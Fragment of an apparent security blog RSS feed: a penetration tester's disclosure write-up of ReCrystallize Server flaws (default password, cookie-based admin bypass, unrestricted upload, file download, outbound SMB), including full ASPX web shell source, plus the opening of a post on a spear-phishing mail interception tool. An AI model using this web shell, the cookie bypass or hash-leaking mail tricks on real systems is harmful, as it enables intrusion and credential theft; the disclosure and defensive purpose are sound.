href=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/3.png\"><img loading=\"lazy\" decoding=\"async\" width=\"602\" height=\"527\" src=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/3.png\" alt=\"\" class=\"wp-image-72565\"></a></figure>\n\n\n\n<p>The first hit was a bit misleading as the subject was not about vulnerabilities. Are there any known CVEs perhaps?</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/4.png\"><img loading=\"lazy\" decoding=\"async\" width=\"602\" height=\"664\" src=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/4.png\" alt=\"\" class=\"wp-image-72566\"></a></figure>\n\n\n\n<p>It seems that this application is completely secure. As it often happens on assessments, I was short on time. So, let&#x2019;s skip it right?</p>\n\n\n\n<p>In the image above you see a search result referring to an <a href=\"https://www.recrystallize.com/merchant/ReCrystallize%20Server%20Installation%20and%20Administration.pdf\" data-type=\"link\" data-id=\"https://www.recrystallize.com/merchant/ReCrystallize%20Server%20Installation%20and%20Administration.pdf\" target=\"_blank\" rel=\"noreferrer noopener\">installation guide</a>. Perhaps some juicy information is disclosed in there, so I decided to have a look. This was not a wrong decision!</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/5.png\"><img loading=\"lazy\" decoding=\"async\" width=\"602\" height=\"390\" src=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/5.png\" alt=\"\" class=\"wp-image-72567\"></a></figure>\n\n\n\n<p>Ok&#x2026; My short list with default passwords did not work at first, but surely the password is not really &#x2018;pw&#x2019;? It actually was.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/3.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1041\" height=\"379\" src=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/3-1024x373.png\" alt=\"\" class=\"wp-image-74308\"></a></figure>\n\n\n\n<p>System Info, Settings, Manage Files&#x2026;. I can smell it already, an over privileged process probably! The first thing I could think about was uploading a web shell within &#x2018;Manage Files&#x2019;. Unfortunately, the functionality was not working since there was no license present. Next would be &#x2018;System Info&#x2019; to gather some information about the system.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/7.png\"><img loading=\"lazy\" decoding=\"async\" width=\"602\" height=\"674\" src=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/7.png\" alt=\"\" class=\"wp-image-72569\"></a></figure>\n\n\n\n<p>Let&#x2019;s have a look at what could be important. Based on this information we know that the application runs on the system drive (C:). This is useful to know for command execution payloads or Local File Inclusion (LFI) vulnerabilities. The process is running as &#x2018;NT AUTHORITY\\SYSTEM&#x2019;, which is a local account with the highest privileges. We also now know where ReCrystallize Server is installed and therefore would be able to find out where files are going to be stored. In this example you are also able to see that the server is domain joined (no this is not a client domain as I made an effort to set up a lab environment).</p>\n\n\n\n<p>You might remember the &#x2018;Settings&#x2019; button being present as an administrator function. A lot of options were present under settings such as configuring database credentials, configuring SMTP server settings, etc. None of them were configured, but I wanted to highlight one setting.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/4.png\"><img loading=\"lazy\" decoding=\"async\" width=\"632\" height=\"586\" src=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/4.png\" alt=\"\" class=\"wp-image-74310\"></a></figure>\n\n\n\n<p>As the admin user, I was able to allow the use of absolute paths. This seemed like an important setting for me, but later in this post you will find out that it really is not. This looks like the start of Local File Inclusion.</p>\n\n\n\n<p>The installation manual I mentioned earlier showed this:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/9.png\"><img loading=\"lazy\" decoding=\"async\" width=\"602\" height=\"197\" src=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/9.png\" alt=\"\" class=\"wp-image-72571\"></a></figure>\n\n\n\n<p>Apparently, the application can view the contents of a folder specified in the &#x2018;folderName&#x2019; parameter. Since I allowed absolute paths, let&#x2019;s see the functionality in action.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/10.png\"><img loading=\"lazy\" decoding=\"async\" width=\"602\" height=\"316\" src=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/10.png\" alt=\"\" class=\"wp-image-72572\"></a></figure>\n\n\n\n<p>Sweet, I can see the contents of &#x2018;C:\\Program Files (x86)&#x2019;. I just wished there was a way to get the files instead of folders. While playing around with the application and crawling through the manual, I was able to download files from the server.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/11.png\"><img loading=\"lazy\" decoding=\"async\" width=\"602\" height=\"552\" src=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/11.png\" alt=\"\" class=\"wp-image-72573\"></a></figure>\n\n\n\n<p>I exploited this a bit to get access to network shares, extract information regarding the associated Active Directory environment and got database credentials. </p>\n\n\n\n<p>Although I was not able to upload a web shell, I was happy with it and ready to notify the client. As if it was written in the almighty guidelines of system administrators, the reaction was:</p>\n\n\n\n<p>&#x201C;You were only able to do that because we did not configure it. After hardening the configuration, this would not be possible anymore&#x201D;</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/12-1.png\"><img loading=\"lazy\" decoding=\"async\" width=\"602\" height=\"432\" src=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/12-1.png\" alt=\"\" class=\"wp-image-72575\"></a></figure>\n\n\n\n<p>Hmm, challenge accepted then. The next morning, I was able to retest the findings on the &#x2018;hardened&#x2019; configuration of ReCrystallize Server.</p>\n\n\n\n<p>For the ones that watched Top Gear with James May, &#x201C;Bollocks&#x201D;! The default password was of course changed, the use of absolute paths was disabled. This shouldn&#x2019;t be happening!</p>\n\n\n\n<p><strong>CVE-2024-26331</strong><br>Luckily, I took a note of some strange behaviour before the client reconfigured the ReCrystallize Server. On some occasions, the session of the core application expired but I was able to continue in the third-party software ReCrystallize Server. I also noted a cookie being set only for ReCrystallize Server, namely &#x2018;AdminUsername=admin&#x2019;.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/13.png\"><img loading=\"lazy\" decoding=\"async\" width=\"602\" height=\"539\" src=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/13.png\" alt=\"\" class=\"wp-image-72576\"></a></figure>\n\n\n\n<p>Let&#x2019;s try to access the admin functionality without and with the cookie being set.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/14.png\"><img loading=\"lazy\" decoding=\"async\" width=\"602\" height=\"581\" src=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/14.png\" alt=\"\" class=\"wp-image-72577\"></a></figure>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/15.png\"><img loading=\"lazy\" decoding=\"async\" width=\"602\" height=\"661\" src=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/15.png\" alt=\"\" class=\"wp-image-72578\"></a></figure>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/16.png\"><img loading=\"lazy\" decoding=\"async\" width=\"602\" height=\"327\" src=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/16.png\" alt=\"\" class=\"wp-image-72579\"></a></figure>\n\n\n\n<p>Nice, I have administrative access again!</p>\n\n\n\n<p><strong>CVE-2024-28269</strong><br>With a license now present, it was possible to use the &#x2018;Manage Files&#x2019; feature. This happened to be a way to upload files without restrictions. Unrestricted File Upload? Let&#x2019;s get RCE!</p>\n\n\n\n<p>Uploading a default ASPX web shell would probably raise an alert. We could do obfuscation and all other kinds of tricks. Instead, I wanted to keep things simple when I searched for an appropriate web shell on the Internet. I created 2 files, report.aspx and report.aspx.cs, where accessing report.aspx would execute the code in Report.aspx.cs. In this case I simply executed the <code>systeminfo</code> command.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/17.png\"><img loading=\"lazy\" decoding=\"async\" width=\"618\" height=\"480\" src=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/17.png\" alt=\"\" class=\"wp-image-72580\"></a></figure>\n\n\n\n<p>Content of report.aspx:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>&lt;%@ Page Language=&quot;C#&quot; AutoEventWireup=&quot;true&quot; CodeFile=&quot;report.aspx.cs&quot; Inherits=&quot;Report.Template&quot; %&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Report Template&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;h1&gt;Report Results:&lt;/h1&gt;\n    &lt;pre&gt;&lt;asp:Literal runat=&quot;server&quot; ID=&quot;ReportOutput&quot; EnableViewState=&quot;false&quot; /&gt;&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;</code></pre>\n\n\n\n<p>Content report.aspx.cs:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>using System;\nusing System.Diagnostics;\n\nnamespace Report\n{\n    public partial class Template : System.Web.UI.Page\n    {\n        protected void Page_Load(object sender, EventArgs e)\n        {\n            // Set up process info\n            var processStartInfo = new ProcessStartInfo\n            {\n                FileName = &quot;cmd.exe&quot;,\n                Arguments = &quot;/c systeminfo&quot;, // Replace with your desired target\n                RedirectStandardOutput = true,\n                UseShellExecute = false,\n                CreateNoWindow = true\n            };\n\n            // Start the process\n            using (var process = new Process { StartInfo = processStartInfo })\n            {\n                process.Start();\n                string output = process.StandardOutput.ReadToEnd();\n                process.WaitForExit();\n\n                // Display the output on the web page\n                ReportOutput.Text = output;\n            }\n        }\n    }\n}</code></pre>\n\n\n\n<p>The image below shows the result of calling report.aspx.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/18.png\"><img loading=\"lazy\" decoding=\"async\" width=\"602\" height=\"627\" src=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/18.png\" alt=\"\" class=\"wp-image-72581\"></a></figure>\n\n\n\n<p>This was extremely fun, and the client was happy and amazed with the results. The fact that I only needed to place a specific cookie blew their mind. In agreement with the client, I disclosed the vulnerability to ReCrystallize Software.</p>\n\n\n\n<p><strong>Side quests</strong><br>As mentioned in the beginning, there are some &#x201C;features&#x201D; that could be abused. An example was already given, namely the retrieval of files using absolute paths. Multiple parameters could be used for calling UNC paths, even when the tick-box regarding the use of absolute paths is turned off. An SMB request was sent out to my attacker system running <a href=\"https://github.com/lgandx/Responder\" target=\"_blank\" rel=\"noreferrer noopener\">Responder</a>.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/19.png\"><img loading=\"lazy\" decoding=\"async\" width=\"602\" height=\"264\" src=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/19.png\" alt=\"\" class=\"wp-image-72582\"></a></figure>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/20.png\"><img loading=\"lazy\" decoding=\"async\" width=\"602\" height=\"152\" src=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/20.png\" alt=\"\" class=\"wp-image-72583\"></a></figure>\n\n\n\n<p>The request shown above was executed while not being unauthenticated. It also turned out that the download of files could have been done unauthenticated&#x2026;</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/21.png\"><img loading=\"lazy\" decoding=\"async\" width=\"602\" height=\"532\" src=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/21.png\" alt=\"\" class=\"wp-image-72584\"></a></figure>\n\n\n\n<p>Even when the usage of absolute paths is disabled, you could still get the files. Below is just an example of a way to download system files without authentication.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/22.png\"><img loading=\"lazy\" decoding=\"async\" width=\"598\" height=\"518\" src=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/22.png\" alt=\"\" class=\"wp-image-72585\"></a></figure>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/23.png\"><img loading=\"lazy\" decoding=\"async\" width=\"602\" height=\"435\" src=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/23.png\" alt=\"\" class=\"wp-image-72586\"></a></figure>\n\n\n\n<p>The image below shows that it is also still possible to send an outbound SMB request.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/24.png\"><img loading=\"lazy\" decoding=\"async\" width=\"602\" height=\"483\" src=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/24.png\" alt=\"\" class=\"wp-image-72587\"></a></figure>\n\n\n\n<p><strong>Recommendations</strong><br>There is a lot that can be said about this software. In general, ReCrystallize Software should patch the issues mentioned above. As you&#x2019;d see in the disclosure timeline, that did not go as well as one would hope for, and two years later there still is no formal patch these issues. In the meantime, if you need this application, you should isolate the server /service as much as possible making it only available to users who need it.</p>\n\n\n\n<p>When a patch is available, the application itself should be hardened by making sure that absolute paths are not allowed, the default password is changed and encryption is turned on.</p>\n\n\n\n<p>Also, do not forget to harden the underlying web server by keeping it up-to-date and making sure the principle of  least privilege principle is applied. It is also recommended that you block outbound SMB traffic.</p>\n\n\n\n<p><strong>Disclosure Timeline</strong><br>General note: Due to the pandemic and the amount of other work, the disclosure timeline is a bit lengthier than I wanted. I also learned that requesting a CVE should have been done earlier..</p>\n\n\n\n<p>08-09-2022 &#x2013; Disclosure of authentication bypass and unrestricted file upload vulnerabilities to ReCrystallize Software.<br>12-09-2022 &#x2013; Vulnerabilities were accepted by ReCrystallize Software, expected patch in the next major release.<br>15-11-2022 &#x2013; Expected patch date moved to December 2022 or January 2023.<br>01-03-2023 &#x2013; Requested a status update, but no response.<br>10-07-2023 &#x2013; Requested a status update, but no response.<br>15-02-2024 &#x2013; Requested a CVE from MITRE for the authentication bypass.<br>19-02-2024 &#x2013; CVE-2024-26331 was reserved.<br>19-02-2024 &#x2013; Notified ReCrystallize Software about the reserved CVE and upcoming publication.<br>19-02-2024 &#x2013; Request to MITRE to add another CVE for the Unrestricted File Upload.<br>14-03-2024 &#x2013; CVE-2024-28269 was reserved.<br>14-03-2024 &#x2013; Notified ReCrystallize Software about the reserved CVE and a reminder about publication.<br>14-03-2024 &#x2013; Notified an organization that had an instance of ReCrystallize Server available online.</p>\n",
      "content:encodedSnippet": "TL&DR – While on an assessment, I found an instance of ReCrystallize Server. It had many problems, some of which had to do with insufficient hardening on the client’s side while others were new vulnerabilities I found that when chained together, achieve Remote Code Execution (RCE). These vulnerabilities were disclosed to ReCrystallize Software and MITRE.\nBesides the disclosed vulnerabilities, some “features” were also used for malicious purposes. The replication and validation of the findings were done on my own test environment.\nThis blog post was made public despite that there is no patch available (as far as I am aware of) due to a lack of reply from the vendor after multiple interactions.\nHunting for vulnerabilities\nThis blog post tells the tale of finding two vulnerabilities in ReCrystallize Server software. It started with a web application assessment that was not special in any way. The application in scope was meant for internal use only and the core application was kind of boring. This changed when the application threw some errors when I tried to print a report. Looking at the error is where the fun began!\nThe error showed that third-party software was used for printing reports. The third-party software was ‘ReCrystallize Server’ and was a standalone application.\n\n\n\n\nI had never heard of this software before and assumed it had something to do with SAP Crystal Reports. From here, I could follow the road in 2 directions. The one direction was to read the documentation and find known vulnerabilities for this software, and the other direction was to hit the login and see what would happen. My curiosity was triggered, so I just smashed the Log In button.\n\n\n\n\nCredentials like ‘admin/admin’ or ‘admin/password’ did not work, so back to direction number one. Let’s look for known vulnerabilities.\n\n\n\n\nThe first hit was a bit misleading as the subject was not about vulnerabilities. Are there any known CVEs perhaps?\n\n\n\n\nIt seems that this application is completely secure. As it often happens on assessments, I was short on time. So, let’s skip it right?\nIn the image above you see a search result referring to an installation guide. Perhaps some juicy information is disclosed in there, so I decided to have a look. This was not a wrong decision!\n\n\n\n\nOk… My short list with default passwords did not work at first, but surely the password is not really ‘pw’? It actually was.\n\n\n\n\nSystem Info, Settings, Manage Files…. I can smell it already, an over privileged process probably! The first thing I could think about was uploading a web shell within ‘Manage Files’. Unfortunately, the functionality was not working since there was no license present. Next would be ‘System Info’ to gather some information about the system.\n\n\n\n\nLet’s have a look at what could be important. Based on this information we know that the application runs on the system drive (C:). This is useful to know for command execution payloads or Local File Inclusion (LFI) vulnerabilities. The process is running as ‘NT AUTHORITY\\SYSTEM’, which is a local account with the highest privileges. We also now know where ReCrystallize Server is installed and therefore would be able to find out where files are going to be stored. In this example you are also able to see that the server is domain joined (no this is not a client domain as I made an effort to set up a lab environment).\nYou might remember the ‘Settings’ button being present as an administrator function. A lot of options were present under settings such as configuring database credentials, configuring SMTP server settings, etc. None of them were configured, but I wanted to highlight one setting.\n\n\n\n\nAs the admin user, I was able to allow the use of absolute paths. This seemed like an important setting for me, but later in this post you will find out that it really is not. This looks like the start of Local File Inclusion.\nThe installation manual I mentioned earlier showed this:\n\n\n\n\nApparently, the application can view the contents of a folder specified in the ‘folderName’ parameter. Since I allowed absolute paths, let’s see the functionality in action.\n\n\n\n\nSweet, I can see the contents of ‘C:\\Program Files (x86)’. I just wished there was a way to get the files instead of folders. While playing around with the application and crawling through the manual, I was able to download files from the server.\n\n\n\n\nI exploited this a bit to get access to network shares, extract information regarding the associated Active Directory environment and got database credentials. \nAlthough I was not able to upload a web shell, I was happy with it and ready to notify the client. As if it was written in the almighty guidelines of system administrators, the reaction was:\n“You were only able to do that because we did not configure it. After hardening the configuration, this would not be possible anymore”\n\n\n\n\nHmm, challenge accepted then. The next morning, I was able to retest the findings on the ‘hardened’ configuration of ReCrystallize Server.\nFor the ones that watched Top Gear with James May, “Bollocks”! The default password was of course changed, the use of absolute paths was disabled. This shouldn’t be happening!\nCVE-2024-26331\nLuckily, I took a note of some strange behaviour before the client reconfigured the ReCrystallize Server. On some occasions, the session of the core application expired but I was able to continue in the third-party software ReCrystallize Server. I also noted a cookie being set only for ReCrystallize Server, namely ‘AdminUsername=admin’.\n\n\n\n\nLet’s try to access the admin functionality without and with the cookie being set.\n\n\n\n\n\n\n\n\n\n\n\n\nNice, I have administrative access again!\nCVE-2024-28269\nWith a license now present, it was possible to use the ‘Manage Files’ feature. This happened to be a way to upload files without restrictions. Unrestricted File Upload? Let’s get RCE!\nUploading a default ASPX web shell would probably raise an alert. We could do obfuscation and all other kinds of tricks. Instead, I wanted to keep things simple when I searched for an appropriate web shell on the Internet. I created 2 files, report.aspx and report.aspx.cs, where accessing report.aspx would execute the code in Report.aspx.cs. In this case I simply executed the systeminfo command.\n\n\n\n\nContent of report.aspx:\n<%@ Page Language=\"C#\" AutoEventWireup=\"true\" CodeFile=\"report.aspx.cs\" Inherits=\"Report.Template\" %>\n\n<!DOCTYPE html>\n<html>\n<head>\n    <title>Report Template</title>\n</head>\n<body>\n    <h1>Report Results:</h1>\n    <pre><asp:Literal runat=\"server\" ID=\"ReportOutput\" EnableViewState=\"false\" /></pre>\n</body>\n</html>\nContent report.aspx.cs:\nusing System;\nusing System.Diagnostics;\n\nnamespace Report\n{\n    public partial class Template : System.Web.UI.Page\n    {\n        protected void Page_Load(object sender, EventArgs e)\n        {\n            // Set up process info\n            var processStartInfo = new ProcessStartInfo\n            {\n                FileName = \"cmd.exe\",\n                Arguments = \"/c systeminfo\", // Replace with your desired target\n                RedirectStandardOutput = true,\n                UseShellExecute = false,\n                CreateNoWindow = true\n            };\n\n            // Start the process\n            using (var process = new Process { StartInfo = processStartInfo })\n            {\n                process.Start();\n                string output = process.StandardOutput.ReadToEnd();\n                process.WaitForExit();\n\n                // Display the output on the web page\n                ReportOutput.Text = output;\n            }\n        }\n    }\n}\nThe image below shows the result of calling report.aspx.\n\n\n\n\nThis was extremely fun, and the client was happy and amazed with the results. The fact that I only needed to place a specific cookie blew their mind. In agreement with the client, I disclosed the vulnerability to ReCrystallize Software.\nSide quests\nAs mentioned in the beginning, there are some “features” that could be abused. An example was already given, namely the retrieval of files using absolute paths. Multiple parameters could be used for calling UNC paths, even when the tick-box regarding the use of absolute paths is turned off. An SMB request was sent out to my attacker system running Responder.\n\n\n\n\n\n\n\n\nThe request shown above was executed while not being unauthenticated. It also turned out that the download of files could have been done unauthenticated…\n\n\n\n\nEven when the usage of absolute paths is disabled, you could still get the files. Below is just an example of a way to download system files without authentication.\n\n\n\n\n\n\n\n\nThe image below shows that it is also still possible to send an outbound SMB request.\n\n\n\n\nRecommendations\nThere is a lot that can be said about this software. In general, ReCrystallize Software should patch the issues mentioned above. As you’d see in the disclosure timeline, that did not go as well as one would hope for, and two years later there still is no formal patch these issues. In the meantime, if you need this application, you should isolate the server /service as much as possible making it only available to users who need it.\nWhen a patch is available, the application itself should be hardened by making sure that absolute paths are not allowed, the default password is changed and encryption is turned on.\nAlso, do not forget to harden the underlying web server by keeping it up-to-date and making sure the principle of  least privilege principle is applied. It is also recommended that you block outbound SMB traffic.\nDisclosure Timeline\nGeneral note: Due to the pandemic and the amount of other work, the disclosure timeline is a bit lengthier than I wanted. I also learned that requesting a CVE should have been done earlier..\n08-09-2022 – Disclosure of authentication bypass and unrestricted file upload vulnerabilities to ReCrystallize Software.\n12-09-2022 – Vulnerabilities were accepted by ReCrystallize Software, expected patch in the next major release.\n15-11-2022 – Expected patch date moved to December 2022 or January 2023.\n01-03-2023 – Requested a status update, but no response.\n10-07-2023 – Requested a status update, but no response.\n15-02-2024 – Requested a CVE from MITRE for the authentication bypass.\n19-02-2024 – CVE-2024-26331 was reserved.\n19-02-2024 – Notified ReCrystallize Software about the reserved CVE and upcoming publication.\n19-02-2024 – Request to MITRE to add another CVE for the Unrestricted File Upload.\n14-03-2024 – CVE-2024-28269 was reserved.\n14-03-2024 – Notified ReCrystallize Software about the reserved CVE and a reminder about publication.\n14-03-2024 – Notified an organization that had an instance of ReCrystallize Server available online.",
      "content": "TL&amp;amp;DR &amp;#x2013; While on an assessment, I found an instance of ReCrystallize Server. It had many problems, some of which had to do with insufficient hardening on the client&amp;#x2019;s side while others were new vulnerabilities I found that when chained together, achieve Remote Code Execution (RCE). These vulnerabilities were disclosed to ReCrystallize Software and MITRE.\n\n",
      "contentSnippet": "TL&amp;DR &#x2013; While on an assessment, I found an instance of ReCrystallize Server. It had many problems, some of which had to do with insufficient hardening on the client&#x2019;s side while others were new vulnerabilities I found that when chained together, achieve Remote Code Execution (RCE). These vulnerabilities were disclosed to ReCrystallize Software and MITRE.",
      "guid": "https://sensepost.com/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/",
      "isoDate": "2024-03-22T07:47:02.000Z",
      "itunes": {}
    },
    {
      "title": "Mail in the Middle – A tool to automate spear phishing campaigns",
      "link": "https://sensepost.com/blog/2024/mail-in-the-middle-a-tool-to-automate-spear-phishing-campaigns/",
      "pubDate": "Mon, 26 Feb 2024 14:32:27 +0000",
      "content:encoded": "<h2 class=\"wp-block-heading\">Context</h2>\n\n\n\n<p>In the chilly month of December 2023, my colleagues Jason (<a href=\"https://twitter.com/BreakerOfSigns\" target=\"_blank\" rel=\"noreferrer noopener\">@BreakerOfSigns</a>), Szymon (<a href=\"https://twitter.com/TH3_GOAT_FARM3R\" target=\"_blank\" rel=\"noreferrer noopener\">@TH3_GOAT_FARM3R</a>), and myself (<a href=\"https://twitter.com/felmoltor\" target=\"_blank\" rel=\"noreferrer noopener\">@felmoltor</a>) were on a red team. This one was tough, but we had fun. We had to be a bit more creative than I am used to and two interesting things were done that are worth sharing:&#xA0;</p>\n\n\n\n<ol start=\"1\">\n<li>Szymon and Jason physically broke into the client&#x2019;s facilities. At a branch office, they left an implant using Rogan&#x2019;s <a href=\"https://sensepost.com/blog/2020/making-the-perfect-red-team-dropbox-part-2/\" target=\"_blank\" rel=\"noreferrer noopener\">&#x201C;Slimjim&#x201D; device</a> and it proved to be a solid and production ready project. <em>Try it out and </em><a href=\"https://twitter.com/sensepost\" target=\"_blank\" rel=\"noreferrer noopener\"><em>let us know</em></a><em> how it goes.</em>&#xA0;</li>\n\n\n\n<li>I developed a tool that we named Mail-in-the-Middle (Maitm for short). You can find it in our Github repository here: <a href=\"https://github.com/sensepost/mail-in-the-middle\" target=\"_blank\" rel=\"noreferrer noopener\">https://github.com/sensepost/mail-in-the-middle</a>.&#xA0;</li>\n</ol>\n\n\n\n<p>I cannot speak in first person about the physical breakin beyond praising the excellent social engineering skills of both of my colleagues, but I <strong>can</strong> talk about Mail-in-the-Middle.&#xA0;</p>\n\n\n\n<p>First, let me explain what is Mail-in-the-Middle and how we approached it.&#xA0;</p>\n\n\n\n<h2 class=\"wp-block-heading\"><strong>What is Maitm?</strong>&#xA0;</h2>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full is-resized\"><a href=\"https://sensepost.com/img/pages/blog/2024/mail-in-the-middle-a-tool-to-automate-spear-phishing-campaigns/dalle-image.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"1024\" src=\"https://sensepost.com/img/pages/blog/2024/mail-in-the-middle-a-tool-to-automate-spear-phishing-campaigns/dalle-image.png\" alt=\"\" class=\"wp-image-73785\" style=\"width:461px;height:auto\"></a></figure></div>\n\n\n<p>The idea is simple; take advantage of the typos that people make when they enter email addresses. If we positioned ourselves in between the sender of an email (be it a person or a system) and the legitimate recipient, we may be able to capture plenty of information about the business, including personally identifiable information, email verification processes, etc. This scenario is effectively a Person-in-the-Middle (PiTM), but for email communications. </p>\n\n\n\n<p>Some examples of how being positioned in the middle of email communications could be useful include:&#xA0;</p>\n\n\n\n<ul>\n<li>A vendor or third party would like to send out an invoice to the finance department of the target but they typo&#x2019;d the domain. An attacker who owns the typo&#x2019;d domain would receive these mails disclosing whatever information was contained within. This provides the attacker with a good pretext for a social engineering attack.</li>\n\n\n\n<li>Let&#x2019;s say an administrator sets up a service to monitor performance of their servers, and proceeded to configure notifications / alarms to be sent to an email address where there was a typo within the domain. An attacker would receive those notifications which might disclose useful information about their internal infrastructure (for instance, software used, hostnames, IP addresses, etc.). </li>\n\n\n\n<li>Or perhaps an employee, from HR, registered an account on a third party service used to manage candidates applying for a job. But this was done using an email address where the domain was typo&#x2019;d. Should the third party service send an email to that account, it would land in the hands of the attackers. An attacker could potentially perform an account takeover by requesting a password reset.  </li>\n\n\n\n<li>What if an attacker finds that they were receiving OTP&#x2019;s for an account registration. In this scenario, they could take advantage of this by actively forwarding on these emails on to the corrected target. This would give the attacker the ability to hijack the account later on should the victim user complete the registration process using the forwarded OTP. </li>\n\n\n\n<li>A more active approach could be taken by tainting all the emails coming in and forwarding them on to the legitimate recipient. Links can be modified to point to a phishing page, UNC paths can also be injected as images on the email or mail headers (see <a href=\"https://www.varonis.com/blog/outlook-vulnerability-new-ways-to-leak-ntlm-hashes\" target=\"_blank\" rel=\"noreferrer noopener\">CVE-2023-35636</a>) to exfiltrate NetNTLM hashes, or attachments can be injected to deliver your malicious payload.&#xA0;</li>\n</ul>\n\n\n\n<p>In summary, doing this would be similar to receiving an Amazon package wrongly delivered to you, swapping the Rolex inside the package with the Casio, repackaging it, and leaving the parcel on your neighbours doorstep (hoping they don&#x2019;t notice).&#xA0;&#xA0;</p>\n\n\n\n<p><em>The original idea of doing this mail interception manually was not ours (Szymon, Jason, or Felipe), but it was rather passed down 